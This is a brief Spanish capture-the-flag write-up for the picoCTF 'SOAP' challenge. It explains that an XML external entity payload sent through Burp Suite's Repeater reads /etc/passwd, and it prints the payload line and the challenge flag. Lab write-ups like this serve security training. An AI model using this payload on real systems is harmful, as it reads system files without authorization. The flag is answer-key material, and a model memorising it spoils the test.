**Reto:** SOAP

**Descripción:**
El proyecto web se realizó con prisas y no se realizó ninguna evaluación de seguridad. ¿Puedes leer el archivo /etc/passwd?[Portal web](http://saturn.picoctf.net:56207/)


**Solución:**
usamos burp suite y el payload de lectura de archivo en el  repetidor 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>


picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
**Notas adicionales:**

**Referencias:** 
https://www.youtube.com/watch?v=b1pGlutUL34
